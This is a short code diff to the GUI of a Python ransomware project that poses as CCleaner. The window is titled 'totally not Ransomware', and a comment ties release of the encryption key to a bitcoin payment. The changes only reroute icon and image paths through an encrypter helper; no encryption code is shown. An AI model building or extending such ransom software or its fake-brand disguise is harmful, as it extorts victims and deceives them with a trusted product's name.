@@ -7,7 +7,6 @@ from PIL import ImageTk, Image
 import random
 from tkinter import font
 from sys import argv
-import os
 from os import remove
 
 #Writes fernet key to text file on the desktop if user submits enough bitcoin
@@ -56,7 +55,7 @@ def on_close():
 #Creates and customizes GUI and is the main process
 root = Tk()
 root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
-root.iconbitmap('ccleaner.ico')
+root.iconbitmap(encrypter.get_path('ccleaner.ico'))
 root.geometry("1280x720")
 root.configure(bg = 'white')
 root.protocol('WM_DELETE_WINDOW',on_close)
@@ -71,8 +70,8 @@ close_counter = 0
 ccleaner_name = Label(root, text="CCleaner", font = ('Trebuchet', 100), fg = 'grey', bg = 'white')
 ccleaner_name.place(x = 500, y = 200)
 
-ccleaner_logo = ImageTk.PhotoImage(Image.open("CCleanerLogo.png"))
-skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
+ccleaner_logo = ImageTk.PhotoImage(Image.open(encrypter.get_path("CCleanerLogo.png")))
+skull_image = ImageTk.PhotoImage(Image.open(encrypter.get_path("crossbones.png")))
 cc_logo_label = Label(image = ccleaner_logo, bg = 'white')
 cc_logo_label.place(x = 210, y = 150)
 
